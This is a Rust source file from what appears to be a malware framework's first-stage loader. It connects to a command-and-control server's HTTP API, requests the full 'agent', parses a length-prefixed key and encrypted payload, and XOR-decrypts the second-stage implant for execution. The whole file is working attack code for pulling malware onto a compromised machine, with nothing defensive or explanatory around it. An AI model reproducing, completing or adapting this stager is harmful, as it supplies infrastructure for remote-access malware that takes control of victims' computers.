//! Agent download functionality for Stage0
//!
//! Downloads the full agent from the C2 server via HTTP API

use crate::config::get_c2_server;
use std::error::Error;
use std::io::{Read, Write};
use std::net::TcpStream;

/// Downloads the full agent from C2 via HTTP API
///
/// Protocol:
/// 1. Connect to C2 server HTTP API (port 5555)
/// 2. Request GET /api/stage0/agent
/// 3. Parse response: key_len(4) + key + size(4) + encrypted_agent
/// 4. XOR decrypt the agent
///
/// # Returns
///
/// * `Ok(Vec<u8>)` - Downloaded and decrypted agent bytes
/// * `Err(_)` - Download failed
pub fn download_agent_http() -> Result<Vec<u8>, Box<dyn Error>> {
    let server = get_c2_server();
    let parts: Vec<&str> = server.split(':').collect();
    if parts.len() != 2 {
        return Err("Invalid server address".into());
    }
    
    let host = parts[0];
    // Use API port (5555) instead of C2 port (4444)
    let api_addr = format!("{}:5555", host);
    
    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Connecting to HTTP API at {}", api_addr);
    
    let mut stream = TcpStream::connect(&api_addr)?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(60)))?;
    
    // Send HTTP GET request
    let request = format!(
        "GET /api/stage0/agent HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: close\r\n\
         \r\n",
        host
    );
    
    stream.write_all(request.as_bytes())?;
    stream.flush()?;
    
    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Request sent, waiting for response...");
    
    // Read response
    let mut response = Vec::new();
    stream.read_to_end(&mut response)?;
    
    // Find end of HTTP headers
    let header_end = find_header_end(&response)
        .ok_or("Invalid HTTP response")?;
    
    let body = &response[header_end..];
    
    // Check for errors
    if body.starts_with(b"ERROR:") {
        let error_msg = String::from_utf8_lossy(body);
        return Err(error_msg.into_owned().into());
    }
    
    if body.len() < 8 {
        return Err("Response too small".into());
    }
    
    // Parse response: key_len(4) + key + size(4) + encrypted_agent
    let key_len = u32::from_le_bytes([body[0], body[1], body[2], body[3]]) as usize;
    
    if body.len() < 4 + key_len + 4 {
        return Err("Response truncated".into());
    }
    
    let key = &body[4..4+key_len];
    let agent_size = u32::from_le_bytes([
        body[4+key_len], 
        body[4+key_len+1], 
        body[4+key_len+2], 
        body[4+key_len+3]
    ]) as usize;
    
    let encrypted_agent = &body[4+key_len+4..];
    
    if encrypted_agent.len() != agent_size {
        return Err(format!(
            "Size mismatch: expected {}, got {}", 
            agent_size, 
            encrypted_agent.len()
        ).into());
    }
    
    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Received {} bytes, decrypting...", agent_size);
    
    // XOR decrypt
    let decrypted: Vec<u8> = encrypted_agent
        .iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect();
    
    #[cfg(feature = "dev")]
    println!("[DOWNLOAD] Agent decrypted: {} bytes", decrypted.len());
    
    Ok(decrypted)
}

/// Find the end of HTTP headers (\r\n\r\n)
fn find_header_end(data: &[u8]) -> Option<usize> {
    for i in 0..data.len().saturating_sub(3) {
        if data[i..i+4] == *b"\r\n\r\n" {
            return Some(i + 4);
        }
    }
    None
}

/// Legacy: Downloads agent via TLS session (for backwards compatibility)
#[allow(dead_code)]
pub fn download_agent(_session: &mut crate::network::Session) -> Result<Vec<u8>, Box<dyn Error>> {
    // Now we use HTTP API instead
    download_agent_http()
}
